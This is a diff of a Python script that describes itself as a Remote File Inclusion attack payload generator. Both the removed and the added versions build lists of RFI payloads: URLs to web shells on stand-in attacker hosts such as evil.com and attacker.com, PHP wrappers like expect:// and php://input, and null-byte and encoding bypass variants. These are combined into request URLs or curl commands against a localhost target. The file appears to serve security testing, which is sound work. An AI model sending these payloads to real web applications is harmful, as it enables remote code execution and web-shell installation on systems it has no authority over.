@@ -1,80 +1,49 @@
+"""
+tools/rfi_atk.py — Remote File Inclusion attack payload generator
+"""
 import random
-import urllib.parse
 
-TARGET = "http://localhost/test?"
-
-PARAMS = [
-    "file", "page", "include", "template",
-    "load", "path", "view", "doc",
-    "module", "content", "resource"
+_HTTP = [
+    "http://evil.com/shell.php",
+    "http://attacker.com/malware.txt",
+    "http://192.168.1.100/backdoor.php",
+    "http://evil.example.com/c99.php",
+    "http://malicious-host.net/webshell.php?",
 ]
 
-REMOTE_HOSTS = [
-    "http://example.com",
-    "https://abc.com",
-    "ftp://files.local",
+_HTTPS = [
+    "https://evil.com/shell.php",
+    "https://attacker.com/payload.txt",
+    "https://raw.githubusercontent.com/attacker/shells/main/shell.php",
 ]
 
-WRAPPERS = [
-    "php://input",
-    "php://filter/resource=index.php",
-    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
-    "expect://id",
-    "phar://archive.zip",
+_FTP = [
+    "ftp://attacker.com/shell.php",
+    "ftp://anonymous:pass@evil.com/shell.txt",
 ]
 
-PATHS = [
-    "/shell.php",
-    "/test.txt",
-    "/config.php",
-    "/admin.php",
-    "/backup.zip"
+_PHP_FILTERS = [
+    "http://evil.com/shell.php%00",
+    "http://evil.com/shell.php?",
+    "http://evil.com/shell.php#",
+    "http://evil.com/\\\\shell.php",
 ]
 
-def random_case(s):
-    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
+_ENCODED = [
+    "http%3A%2F%2Fevil.com%2Fshell.php",
+    "http://evil.com%2fshell.php",
+    "http:\\/\\/evil.com\\/shell.php",
+]
 
-def maybe_encode(s):
-    if random.random() > 0.5:
-        s = urllib.parse.quote(s)
-    if random.random() > 0.7:
-        s = urllib.parse.quote(s)
-    return s
+ALL_PAYLOADS = _HTTP + _HTTPS + _FTP + _PHP_FILTERS + _ENCODED
 
-def maybe_null_byte(s):
-    if random.random() > 0.7:
-        s += "%00"
-    return s
+RFI_PATHS  = ["/load", "/include", "/file", "/module", "/plugin", "/template"]
+RFI_PARAMS = ["file", "include", "url", "path", "module", "template", "page"]
 
-def maybe_protocol_relative(host):
-    if random.random() > 0.5:
-        return host.replace("http://", "//")
-    return host
 
-def generate_payload():
-    if random.random() > 0.5:
-        host = random.choice(REMOTE_HOSTS)
-        host = maybe_protocol_relative(host)
-        path = random.choice(PATHS)
-        payload = host + path
-    else:
-        payload = random.choice(WRAPPERS)
-
-    if random.random() > 0.5:
-        payload = random_case(payload)
-
-    payload = maybe_null_byte(payload)
-    payload = maybe_encode(payload)
-
-    return payload
-
-generated = set()
-
-while len(generated) < 100:
-    param = random.choice(PARAMS)
-    payload = generate_payload()
-    curl_cmd = f'curl "{TARGET}{param}={payload}"'
-    generated.add(curl_cmd)
-
-for cmd in generated:
-    print(cmd)
+def generate() -> tuple[str, str]:
+    payload = random.choice(ALL_PAYLOADS)
+    path    = random.choice(RFI_PATHS)
+    param   = random.choice(RFI_PARAMS)
+    url     = f"http://localhost:8000{path}?{param}={payload}"
+    return url, payload
